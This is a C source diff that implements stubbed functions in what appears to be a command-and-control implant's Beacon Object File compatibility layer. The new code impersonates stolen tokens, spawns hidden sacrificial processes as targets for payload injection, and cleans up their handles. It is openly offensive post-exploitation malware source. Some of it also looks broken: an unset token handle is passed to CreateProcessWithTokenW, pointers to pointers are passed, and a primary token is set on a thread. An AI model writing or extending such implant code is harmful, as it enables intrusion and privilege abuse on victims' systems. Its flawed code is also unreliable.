@@ -246,13 +246,22 @@ VOID BeaconFormatInt( PFORMAT format, int value)
 
 BOOL BeaconUseToken( HANDLE token )
 {
-    // TODO: handle this
+    HANDLE hImpersonateToken = INVALID_HANDLE_VALUE;
+
+    if (!DuplicateTokenEx(token, 0, NULL, SecurityImpersonation, TokenPrimary, &hImpersonateToken)) {
+        return FALSE;
+    }
+    if (!SetThreadToken(NULL, hImpersonateToken)) {
+        return FALSE;
+    }
+
     return TRUE;
 }
 
-VOID BeaconRevertToken( VOID ) 
+VOID BeaconRevertToken( VOID )
 {
-    // TODO: handle this
+    if (!Instance->Win32.RevertToSelf())
+        return;
 }
 
 VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
@@ -278,7 +287,36 @@ VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
 
 BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo )
 {
-    // TODO: handle this
+    BOOL    bSuccess    = FALSE;
+    HANDLE  hToken      = INVALID_HANDLE_VALUE;
+    PCHAR   Path        = NULL;
+
+    if (x86) {
+        Path = Instance->Config.Process.Spawn86;
+    } else {
+        Path = Instance->Config.Process.Spawn64;
+    }
+
+    if (ignoreToken) {
+        bSuccess = Instance->Win32.CreateProcessA(NULL, Path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
+    } else {
+        PWCHAR wPath    = NULL;
+        SIZE_T Size     = 0;
+        SIZE_T Len      = 0;
+
+        Len = strlen(Path) + 1;
+        Size = Len * sizeof(WCHAR);
+        wPath = (PWCHAR) malloc(Size);
+        memset(wPath, 0, Size);
+
+        if (toWideChar(Path, wPath, Size) <= 0) {
+            return FALSE;
+        }
+
+        bSuccess = Instance->Win32.CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, wPath, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &sInfo, &pInfo);
+    }
+
+    return bSuccess;
 }
 
 VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char * arg, int a_len )
@@ -293,11 +331,20 @@ VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, in
 
 VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )
 {
-    // TODO: handle this
+    NTSTATUS status;
+
+    status = Instance->Win32.NtClose(pInfo->hProcess);
+    if (status != STATUS_SUCCESS)
+        return;
+
+    status = Instance->Win32.NtClose(pInfo->hThread);
+    if (status != STATUS_SUCCESS)
+        return;
 }
 
 BOOL toWideChar( char* src, wchar_t* dst, int max )
 {
-    // TODO: handle this
-    return FALSE;
+    if (max < sizeof(wchar_t))
+        return FALSE;
+    return MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, src, -1, dst, max / sizeof(wchar_t));
 }
